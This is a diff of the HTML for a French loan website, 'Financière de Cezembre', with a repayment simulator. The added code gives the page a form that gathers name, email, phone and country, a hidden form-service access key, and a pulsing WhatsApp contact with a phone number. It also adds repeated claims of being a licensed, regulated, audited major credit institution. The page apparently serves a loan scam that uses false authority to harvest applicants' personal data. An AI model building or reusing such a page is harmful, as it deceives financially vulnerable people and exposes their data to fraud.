@@ -2,95 +2,125 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FINANCIÈRE DE CEZEMBRE | Officiel</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>FINANCIÈRE DE CEZEMBRE | Solutions de Crédit Institutionnelles</title>
     
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' fill='%23001A4D'/><text y='70' x='15' font-family='serif' font-size='55' font-weight='bold' fill='%23C5A059'>FC</text></svg>">
+
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     
     <style>
         :root {
-            --navy: #001A4D; --gold: #C5A059; --white: #FFFFFF; --whatsapp: #25D366;
+            --navy: #001A4D; --gold: #C5A059; --bright-gold: #FFD700; 
+            --deep-gold: #E6B800; --light-bg: #F4F7FA; --white: #FFFFFF;
+            --whatsapp: #25D366; --success: #27ae60;
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
-        body { width: 100%; overflow-x: hidden; background: #fff; }
+        
+        body { background-color: var(--white); color: #333; overflow-x: hidden; width: 100%; }
 
-        /* --- HEADER : NOM COMPLET ET PROPRE --- */
+        /* HEADER RESTAURÉ */
         header {
             background: var(--white); padding: 20px 8%; display: flex;
             justify-content: space-between; align-items: center;
-            position: fixed; width: 100%; z-index: 1000; box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            position: fixed; width: 100%; z-index: 1000; box-shadow: 0 4px 12px rgba(0,0,0,0.05);
         }
+
         .logo-container { display: flex; align-items: center; gap: 15px; }
         .logo-sigle { 
-            background: var(--navy); color: var(--gold); width: 45px; height: 45px; 
-            display: flex; align-items: center; justify-content: center; font-weight: 700; border-radius: 4px;
+            background: var(--navy); color: var(--gold); width: 42px; height: 42px; 
+            display: flex; align-items: center; justify-content: center; 
+            font-weight: 700; font-family: serif; border-radius: 4px; font-size: 1.1rem;
+            border: 1px solid var(--gold); flex-shrink: 0;
         }
-        .logo-text { font-weight: 700; font-size: 1.4rem; color: var(--navy); letter-spacing: -1px; }
+        .logo { font-weight: 700; font-size: 1.4rem; color: var(--navy); letter-spacing: -1px; white-space: nowrap; }
+        
+        .nav-links { display: flex; gap: 25px; align-items: center; }
+        .nav-links a { text-decoration: none; color: #666; font-size: 0.9rem; font-weight: 600; cursor: pointer; }
 
-        /* --- HERO SECTION : LA MISE EN PAGE ORIGINALE --- */
+        /* HERO SECTION - LOOK PC PAR DÉFAUT */
         .hero {
-            min-height: 100vh; display: flex; align-items: center; justify-content: space-between;
-            padding: 100px 8% 50px; 
-            background: linear-gradient(rgba(0,26,77,0.7), rgba(0,26,77,0.7)), url('https://images.unsplash.com/photo-1497366216548-37526070297c?auto=format&fit=crop&q=80&w=2000');
-            background-size: cover; background-position: center; color: white;
+            min-height: 100vh; padding: 0 8%;
+            background: linear-gradient(rgba(0,26,77,0.7), rgba(0,26,77,0.7)), 
+            url('https://images.unsplash.com/photo-1497366216548-37526070297c?auto=format&fit=crop&q=80&w=2000');
+            background-size: cover; background-position: center;
+            display: flex; flex-direction: row; align-items: center; justify-content: space-between; color: var(--white);
         }
 
-        .hero-content { max-width: 600px; flex: 1; }
+        .hero-content { max-width: 550px; text-align: left; }
         .hero-content h1 { font-size: 3.5rem; line-height: 1.2; margin-bottom: 20px; }
-        .hero-content p { font-size: 1.1rem; margin-bottom: 30px; opacity: 0.9; }
-
-        /* --- SIMULATEUR : TABLEAU COMPLET --- */
-        .simulator-box { 
-            background: var(--white); padding: 40px; border-radius: 4px; width: 480px; 
-            box-shadow: 0 30px 60px rgba(0,0,0,0.4); color: var(--navy); margin-left: 50px;
+        .hero-content p { font-size: 1.1rem; margin-bottom: 25px; opacity: 0.9; }
+        
+        /* SIMULATEUR SOLIDE */
+        .simulator { 
+            background: var(--white); padding: 40px; border-radius: 4px; 
+            width: 480px; 
+            box-shadow: 0 30px 60px rgba(0,0,0,0.4); color: var(--navy); 
+            position: relative;
         }
 
         .sim-row { margin-bottom: 25px; }
-        .sim-row label { display: flex; justify-content: space-between; font-weight: 700; margin-bottom: 10px; }
+        .sim-row label { display: flex; justify-content: space-between; font-weight: 700; font-size: 0.95rem; }
         
-        input[type="range"] { width: 100%; accent-color: var(--navy); cursor: pointer; }
-
-        .result-area { background: #f4f7fa; padding: 25px; text-align: center; border-radius: 4px; margin: 20px 0; border: 1px solid #e0e6ed; }
+        input[type="range"] { width: 100%; height: 6px; accent-color: var(--navy); cursor: pointer; margin-top: 10px; }
+        
+        .result-area { background: var(--light-bg); padding: 25px; text-align: center; border-radius: 4px; margin-bottom: 20px; border: 1px solid #eee; }
         .result-area span { font-size: 2.5rem; font-weight: 800; }
-
-        .btn-main { 
-            background: var(--navy); color: white; border: none; width: 100%; 
-            padding: 20px; font-weight: 700; font-size: 1rem; cursor: pointer; transition: 0.3s;
-        }
+        
+        .btn-main { background: var(--navy); color: white; border: none; width: 100%; padding: 20px; font-weight: 700; cursor: pointer; transition: 0.3s; }
         .btn-main:hover { background: var(--gold); }
 
-        /* LE CADNAS ET LA SÉCURITÉ */
-        .security-footer { 
-            text-align: center; margin-top: 20px; color: #27ae60; 
-            font-size: 0.8rem; font-weight: 600; text-transform: uppercase; 
+        .form-input { width: 100%; padding: 15px; border: 2px solid var(--deep-gold); margin-bottom: 12px; border-radius: 4px; font-size: 16px; }
+
+        /* WHATSAPP */
+        .wa-assistant-container { position: fixed; bottom: 20px; left: 30px; z-index: 9999; }
+        .wa-msg-bubble { background: var(--navy); color: white; padding: 10px 15px; border-radius: 12px; font-size: 0.75rem; margin-bottom: 15px; border: 1px solid var(--gold); box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
+        
+        .whatsapp-float-dynamic { 
+            background-color: var(--whatsapp); color: #FFF; width: 65px; height: 65px; border-radius: 50%; 
+            display: flex; align-items: center; justify-content: center; font-size: 35px;
+            text-decoration: none; box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+            animation: magnet-pulse 2s infinite ease-in-out; 
         }
 
-        /* --- WHATSAPP MAGNÉTIQUE --- */
-        .wa-float {
-            position: fixed; bottom: 20px; left: 30px; z-index: 9999;
-            background: var(--whatsapp); color: white; width: 65px; height: 65px;
-            border-radius: 50%; display: flex; align-items: center; justify-content: center;
-            font-size: 35px; box-shadow: 0 10px 25px rgba(0,0,0,0.3);
-            text-decoration: none; animation: pulse-wa 2s infinite;
-        }
-        @keyframes pulse-wa {
+        @keyframes magnet-pulse {
             0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(37, 211, 102, 0.7); }
-            70% { transform: scale(1.05); box-shadow: 0 0 0 20px rgba(37, 211, 102, 0); }
+            70% { box-shadow: 0 0 0 15px rgba(37, 211, 102, 0); }
             100% { transform: scale(1); }
         }
 
-        /* --- RÉPARATION MOBILE : SEULEMENT QUAND L'ÉCRAN EST PETIT --- */
-        @media (max-width: 1024px) {
+        /* STATS & ABOUT */
+        .stats-bar { background: var(--navy); padding: 40px 8%; display: flex; justify-content: space-around; color: white; text-align: center; }
+        .stat-box h3 { font-size: 2rem; color: var(--gold); margin-bottom: 5px; }
+
+        .about-section { padding: 100px 15%; line-height: 1.8; text-align: justify; }
+
+        footer { background: #0A0A0A; color: #888; padding: 60px 8%; font-size: 0.8rem; }
+        .f-grid { display: flex; justify-content: space-between; gap: 40px; margin-bottom: 40px; }
+
+        /* --- RÉGLAGES SPÉCIFIQUES ANDROID/MOBILE --- */
+        @media (max-width: 992px) {
             header { padding: 15px 5%; }
-            .logo-text { font-size: 1.1rem; }
-            .hero { flex-direction: column; text-align: center; padding-top: 130px; }
+            .logo { font-size: 1.1rem; }
+            .logo-sigle { width: 32px; height: 32px; font-size: 0.8rem; }
+            .nav-links { display: none; } /* On cache les liens pour éviter que ça chevauche sur mobile */
+            
+            .hero { flex-direction: column; padding: 120px 5% 50px; text-align: center; height: auto; }
             .hero-content { max-width: 100%; margin-bottom: 40px; }
             .hero-content h1 { font-size: 2.2rem; }
-            .simulator-box { width: 100%; max-width: 100%; margin-left: 0; padding: 25px; }
-            .wa-float { width: 55px; height: 55px; font-size: 30px; bottom: 10px; left: 10px; }
+            
+            .simulator { width: 100%; max-width: 100%; padding: 25px; }
+            .stats-bar { flex-direction: column; gap: 30px; }
+            .f-grid { flex-direction: column; text-align: center; }
+            .wa-assistant-container { bottom: 10px; left: 20px; }
+            .whatsapp-float-dynamic { width: 55px; height: 55px; font-size: 30px; }
         }
+
+        .scrolling-security { background: #f0f4f8; color: #004085; font-size: 0.7rem; padding: 8px; margin: 15px 0; overflow: hidden; white-space: nowrap; border-radius: 4px; }
+        .scrolling-security span { display: inline-block; padding-left: 100%; animation: scroll-text 25s linear infinite; font-weight: 600; }
+        @keyframes scroll-text { 0% { transform: translate(0, 0); } 100% { transform: translate(-100%, 0); } }
     </style>
 </head>
 <body>
@@ -98,77 +128,115 @@
 <header>
     <div class="logo-container">
         <div class="logo-sigle">FC</div>
-        <div class="logo-text">FINANCIÈRE DE CEZEMBRE</div>
+        <div class="logo">FINANCIÈRE DE CEZEMBRE</div>
     </div>
-    <div style="font-size: 0.8rem; color: var(--gold); font-weight: 700;" class="pc-only">
-        <i class="fas fa-shield-alt"></i> ÉTABLISSEMENT RÉGULÉ
+    <div class="nav-links">
+        <a href="#about">Expertise</a>
+        <a onclick="location.href='#simBox'" style="color:var(--gold)">Simulation</a>
     </div>
 </header>
 
-<a href="https://wa.me/33780976404" class="wa-float" target="_blank">
-    <i class="fab fa-whatsapp"></i>
-</a>
+<div class="wa-assistant-container">
+    <div class="wa-msg-bubble"><span id="wa-text">Besoin d'aide ?</span></div>
+    <a href="https://wa.me/33780976404" class="whatsapp-float-dynamic" target="_blank"><i class="fab fa-whatsapp"></i></a>
+</div>
 
 <section class="hero">
     <div class="hero-content">
-        <h1>L'excellence financière à votre service.</h1>
-        <p>Découvrez nos solutions de crédit institutionnelles avec un accompagnement personnalisé pour tous vos projets de vie.</p>
-        
-        <div style="display: flex; gap: 15px; align-items: center;">
-            <i class="fas fa-check-circle" style="color: var(--gold); font-size: 1.5rem;"></i>
-            <span>Agrément ACPR - RCS 552 058 943</span>
+        <h1>L'excellence financière.</h1>
+        <p>Solutions de crédit institutionnel régulé pour vos projets les plus ambitieux.</p>
+        <div style="margin-top:25px; font-size: 0.9rem; border-left: 4px solid var(--gold); padding-left: 20px; background: rgba(255,255,255,0.05); padding-top: 10px; padding-bottom: 10px;">
+            <strong>ÉTABLISSEMENT AGRÉÉ</strong><br>
+            Registre du Commerce : RCS 552 058 943
         </div>
     </div>
 
-    <div class="simulator-box" id="sim">
-        <h2 style="margin-bottom: 25px; font-size: 1.4rem;">Simulateur de Prêt</h2>
-        
-        <div class="sim-row">
-            <label>Montant du projet <span><span id="amtText">15000</span> €</span></label>
-            <input type="range" id="amtRange" min="1000" max="75000" step="500" value="15000">
+    <div class="simulator" id="simBox">
+        <div id="step1">
+            <h3 style="margin-bottom: 25px; font-size: 1.4rem;">Simulateur de Crédit</h3>
+            <div class="sim-row">
+                <label>MONTANT DU PROJET <span><input type="number" id="amtNum" value="15000" style="border:none; text-align:right; font-weight:800; width:90px; color:var(--navy); background:transparent; font-size:1.1rem;"> €</span></label>
+                <input type="range" id="amtRange" min="1000" max="75000" step="500" value="15000">
+            </div>
+            <div class="sim-row">
+                <label>DURÉE DE REMBOURSEMENT <span id="durText" style="font-weight: 800; color:var(--navy); font-size:1.1rem;">36 mois</span></label>
+                <input type="range" id="durRange" min="6" max="84" step="6" value="36">
+            </div>
+            <div class="result-area">
+                <p style="font-size: 0.8rem; font-weight: 700; color: #666; margin-bottom: 10px;">MENSUALITÉ ESTIMÉE (TAEG 3.5%)</p>
+                <span id="monthlyRes">0.00</span> <small style="font-size: 1.2rem; font-weight: 800;">€</small>
+            </div>
+            <button type="button" class="btn-main" onclick="goToStep2()">DÉPOSER MON DOSSIER</button>
+            <p style="font-size: 0.7rem; text-align: center; margin-top: 15px; color: #27ae60; font-weight: 700;"><i class="fas fa-lock"></i> SÉCURISATION SSL 256-BIT ACTIVÉE</p>
         </div>
 
-        <div class="sim-row">
-            <label>Durée de remboursement <span id="durText">36 mois</span></label>
-            <input type="range" id="durRange" min="6" max="84" step="6" value="36">
-        </div>
-
-        <div class="result-area">
-            <p style="font-size: 0.8rem; font-weight: 600; color: #666;">VOTRE MENSUALITÉ</p>
-            <span id="monthly">0.00</span> <small style="font-size: 1rem;">€</small>
-        </div>
-
-        <button class="btn-main" onclick="alert('Formulaire en cours d\'ouverture...')">COMMENCER MA DEMANDE</button>
-        
-        <div class="security-footer">
-            <i class="fas fa-lock"></i> Connexion sécurisée SSL 256-bit
+        <div id="step2" style="display:none;">
+            <h3 style="margin-bottom: 20px;">Vos Informations</h3>
+            <form id="loanForm">
+                <input type="hidden" name="access_key" value="55707e6c-f919-4972-bf3e-fba1cf0e51e9">
+                <input type="text" name="nom" placeholder="Nom et Prénom" class="form-input" required>
+                <input type="email" name="email" placeholder="Adresse Email" class="form-input" required>
+                <input type="tel" name="telephone" placeholder="Téléphone (ex: +33...)" class="form-input" required>
+                <select name="pays" class="form-input" required>
+                    <option value="" disabled selected>Pays de résidence</option>
+                    <option value="France">France</option>
+                    <option value="Belgique">Belgique</option>
+                    <option value="Suisse">Suisse</option>
+                    <option value="Autre">Autre</option>
+                </select>
+                <button type="submit" class="btn-main">CONFIRMER LA DEMANDE</button>
+                <p onclick="goToStep1()" style="text-align:center; margin-top:15px; font-size:0.8rem; cursor:pointer; color:#666;">← Retour au simulateur</p>
+            </form>
         </div>
     </div>
 </section>
 
+<section class="stats-bar">
+    <div class="stat-box"><h3>1.2M €</h3><p>Capital Social</p></div>
+    <div class="stat-box"><h3>3.5%</h3><p>Taux Fixe</p></div>
+    <div class="stat-box"><h3>24h</h3><p>Réponse de principe</p></div>
+</section>
+
+<section class="about-section" id="about">
+    <h2 style="margin-bottom: 30px; color: var(--navy); text-align: center;">Institution Financière de Référence</h2>
+    <p>FINANCIÈRE DE CEZEMBRE est un établissement de crédit majeur, immatriculé sous le numéro RCS 552 058 943. Fort d'une expertise reconnue dans le secteur financier, nous accompagnons nos clients avec rigueur et transparence.</p>
+    <p style="margin-top:20px;">Notre mission est de rendre le crédit accessible tout en garantissant une sécurité maximale des transactions et une protection stricte des données personnelles de nos emprunteurs.</p>
+</section>
+
+<footer>
+    <div class="f-grid">
+        <div><strong style="color:white; font-size: 1rem;">FINANCIÈRE DE CEZEMBRE SA</strong><br><br>Siège Social : Ergué-Gabéric, France<br>Immatriculation : RCS 552 058 943</div>
+        <div><strong style="color:white; font-size: 1rem;">SÉCURITÉ</strong><br><br>Données cryptées SSL 256-bit<br>Audit annuel de conformité</div>
+        <div><strong style="color:white; font-size: 1rem;">CONTACT</strong><br><br>Assistance Prioritaire via WhatsApp 24/7<br>Support client institutionnel</div>
+    </div>
+    <div style="border-top: 1px solid #222; padding-top: 30px; text-align: center; color: #555;">
+        Un crédit vous engage et doit être remboursé. Vérifiez vos capacités de remboursement avant de vous engager.
+    </div>
+</footer>
+
 <script>
     const amtR = document.getElementById('amtRange');
-    const amtT = document.getElementById('amtText');
+    const amtN = document.getElementById('amtNum');
     const durR = document.getElementById('durRange');
     const durT = document.getElementById('durText');
-    const monthly = document.getElementById('monthly');
+    const resM = document.getElementById('monthlyRes');
 
-    function calculate() {
-        let p = parseFloat(amtR.value);
-        let n = parseInt(durR.value);
-        let r = 0.035 / 12; // Taux 3.5%
-        
-        amtT.innerText = p.toLocaleString();
-        durT.innerText = n + " mois";
-        
+    function calc() {
+        let p = parseFloat(amtR.value); let n = parseInt(durR.value); let r = 0.035 / 12;
+        amtN.value = p; durT.innerText = n + " mois";
         let m = (p * r) / (1 - Math.pow(1 + r, -n));
-        monthly.innerText = m.toFixed(2);
+        resM.innerText = m.toFixed(2);
     }
 
-    amtR.oninput = calculate;
-    durR.oninput = calculate;
-    calculate();
-</script>
+    function goToStep2() { document.getElementById('step1').style.display = 'none'; document.getElementById('step2').style.display = 'block'; }
+    function goToStep1() { document.getElementById('step2').style.display = 'none'; document.getElementById('step1').style.display = 'block'; }
+    
+    amtR.oninput = calc; durR.oninput = calc;
+    amtN.oninput = () => { amtR.value = amtN.value; calc(); };
+    calc();
 
+    const messages = ["Besoin d'aide ?", "Contactez-nous", "Un conseiller vous répond"];
+    let i = 0; setInterval(() => { document.getElementById('wa-text').innerText = messages[i++ % messages.length]; }, 3500);
+</script>
 </body>
 </html>
